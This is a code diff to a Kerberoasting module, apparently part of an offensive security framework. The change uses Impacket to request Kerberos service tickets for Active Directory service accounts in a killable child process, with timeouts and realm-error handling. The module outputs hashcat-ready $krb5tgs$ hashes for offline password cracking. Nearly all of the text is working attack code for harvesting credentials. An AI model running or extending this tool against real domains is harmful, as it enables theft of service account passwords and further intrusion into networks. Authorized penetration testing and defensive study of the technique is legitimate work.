@@ -1,5 +1,7 @@
 from __future__ import annotations
 import asyncio
+import multiprocessing
+import time
 """
 Kerberoasting — impacket.krb5.kerberosv5 low-level API (impacket ≥0.11 compatible)
 MITRE: T1558.003 — Jitter + rate-limited TGS requests, hashcat-ready output.
@@ -30,6 +32,121 @@ def format_kerberoast_tgs_timeout(candidate_count: int) -> str:
         "Kerberoastable candidate account(s), but the Kerberos TGS request "
         "timed out before a hash was confirmed."
     )
+
+
+def format_kerberos_realm_mismatch() -> str:
+    return (
+        "Kerberos realm mismatch; use the AD DNS domain/realm such as "
+        "lab.local or LAB.LOCAL, not the DC IP address."
+    )
+
+
+def _kerberos_tgs_worker(
+    connection: Any,
+    spn: str,
+    domain: str,
+    dc: str,
+    tgt: Any,
+    cipher: Any,
+    session_key: Any,
+) -> None:
+    """Run one blocking Impacket TGS request in a killable child process."""
+    try:
+        from impacket.krb5.kerberosv5 import getKerberosTGS
+        from impacket.krb5.types import Principal
+        from impacket.krb5 import constants
+
+        server_name = Principal(
+            spn,
+            type=constants.PrincipalNameType.NT_SRV_INST.value,
+        )
+        tgs, _, _, _ = getKerberosTGS(
+            serverName=server_name,
+            domain=domain.upper(),
+            kdcHost=dc,
+            tgt=tgt,
+            cipher=cipher,
+            sessionKey=session_key,
+        )
+        connection.send(("ok", tgs))
+    except BaseException as exc:
+        try:
+            connection.send(("error", exc.__class__.__name__, str(exc)[:160]))
+        except Exception:
+            pass
+    finally:
+        connection.close()
+
+
+def _terminate_tgs_process(process: Any) -> None:
+    if not process.is_alive():
+        process.join(timeout=0)
+        return
+    process.terminate()
+    process.join(timeout=1)
+    if process.is_alive() and hasattr(process, "kill"):
+        process.kill()
+        process.join(timeout=1)
+
+
+async def _run_tgs_request_process(
+    *,
+    spn: str,
+    domain: str,
+    dc: str,
+    tgt: Any,
+    cipher: Any,
+    session_key: Any,
+    timeout_seconds: float,
+    worker: Any = _kerberos_tgs_worker,
+) -> bytes:
+    """Run one synchronous TGS request behind a hard process timeout."""
+    context = multiprocessing.get_context("spawn")
+    parent_connection, child_connection = context.Pipe(duplex=False)
+    process = context.Process(
+        target=worker,
+        args=(child_connection, spn, domain, dc, tgt, cipher, session_key),
+    )
+    started = False
+    try:
+        process.start()
+        started = True
+        child_connection.close()
+
+        deadline = time.monotonic() + timeout_seconds
+        while process.is_alive():
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                _terminate_tgs_process(process)
+                logger.warning(
+                    "kerberoast_tgs_worker_timeout",
+                    timeout_seconds=timeout_seconds,
+                )
+                raise asyncio.TimeoutError
+            await asyncio.sleep(min(0.05, remaining))
+
+        process.join(timeout=0)
+        if not parent_connection.poll():
+            raise RuntimeError("Kerberos TGS worker exited without a result.")
+        response = parent_connection.recv()
+        if response[0] == "error":
+            raise RuntimeError(
+                f"Kerberos TGS request failed: {response[1]}: {response[2]}"
+            )
+        if response[0] != "ok":
+            raise RuntimeError("Kerberos TGS worker returned an invalid result.")
+        return response[1]
+    finally:
+        if started and process.is_alive():
+            _terminate_tgs_process(process)
+        try:
+            child_connection.close()
+        except (OSError, ValueError):
+            pass
+        try:
+            parent_connection.close()
+        except (OSError, ValueError):
+            pass
 
 
 def _format_krb5tgs_hash(tgs: bytes, cipher: "Any", spn: str, domain: str) -> str:
@@ -225,7 +342,7 @@ class KerberoastModule(BaseModule):
             ("impacket", "pyasn1", "pyasn1_modules"),
             module_id=self.MODULE_ID,
         )
-        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+        from impacket.krb5.kerberosv5 import getKerberosTGT
         from impacket.krb5.types import Principal
         from impacket.krb5 import constants
 
@@ -266,6 +383,12 @@ class KerberoastModule(BaseModule):
                     domain=domain,
                     service="Kerberos",
                 ) from exc
+            if "kdc_err_wrong_realm" in err or "wrong realm" in err:
+                raise ModuleValidationError(
+                    format_kerberos_realm_mismatch(),
+                    module_id=self.MODULE_ID,
+                    field="domain",
+                ) from exc
             raise
 
         # Step 2: Query SPN list via LDAP if no target_user specified
@@ -292,6 +415,10 @@ class KerberoastModule(BaseModule):
                 logger.warning("kerberoast_spn_lookup_failed", error=str(exc)[:80])
 
         self._last_spn_count = len(spn_list)
+        logger.info(
+            "kerberoast_spn_candidates",
+            count=self._last_candidate_count,
+        )
 
         if not spn_list:
             return [], []
@@ -299,29 +426,45 @@ class KerberoastModule(BaseModule):
         # Step 3: Request TGS per SPN with per-ticket jitter + rate limit
         hashes:   list[str]  = []
         accounts: list[dict] = []
-
-        def _get_tgs(spn: str):
-            server_name = Principal(
-                spn,
-                type=constants.PrincipalNameType.NT_SRV_INST.value,
-            )
-            return getKerberosTGS(
-                serverName = server_name,
-                domain     = domain.upper(),
-                kdcHost    = dc,
-                tgt        = tgt,
-                cipher     = cipher,
-                sessionKey = session_key,
-            )
+        tgs_collection_deadline = (
+            time.monotonic() + KERBEROS_TGS_TIMEOUT_SECONDS
+        )
 
         for i, spn in enumerate(spn_list):
+            remaining = tgs_collection_deadline - time.monotonic()
+            if remaining <= 0:
+                logger.warning(
+                    "kerberoast_tgs_worker_timeout",
+                    timeout_seconds=KERBEROS_TGS_TIMEOUT_SECONDS,
+                )
+                logger.warning(
+                    "kerberoast_tgs_timeout_classified",
+                    candidates=self._last_candidate_count,
+                )
+                raise ModuleValidationError(
+                    format_kerberoast_tgs_timeout(self._last_candidate_count),
+                    module_id=self.MODULE_ID,
+                    field="kerberos_tgs",
+                )
             try:
-                tgs, tgs_cipher, _, tgs_sk = await asyncio.wait_for(
-                    loop.run_in_executor(None, _get_tgs, spn),
-                    timeout=KERBEROS_TGS_TIMEOUT_SECONDS,
+                logger.info(
+                    "kerberoast_tgs_worker_start",
+                    candidate=spn[:120],
+                )
+                tgs = await asyncio.wait_for(
+                    _run_tgs_request_process(
+                        spn=spn,
+                        domain=domain,
+                        dc=dc,
+                        tgt=tgt,
+                        cipher=cipher,
+                        session_key=session_key,
+                        timeout_seconds=KERBEROS_TGS_TIMEOUT_SECONDS,
+                    ),
+                    timeout=remaining,
                 )
                 # Format as $krb5tgs$ hash for hashcat
-                hash_str = _format_krb5tgs_hash(tgs, tgs_cipher, spn, domain)
+                hash_str = _format_krb5tgs_hash(tgs, None, spn, domain)
                 if hash_str:
                     hashes.append(hash_str)
                     accounts.append({
@@ -330,6 +473,10 @@ class KerberoastModule(BaseModule):
                         "hash": hash_str[:60] + "...",
                     })
             except asyncio.TimeoutError as exc:
+                logger.warning(
+                    "kerberoast_tgs_timeout_classified",
+                    candidates=self._last_candidate_count,
+                )
                 raise ModuleValidationError(
                     format_kerberoast_tgs_timeout(self._last_candidate_count),
                     module_id=self.MODULE_ID,
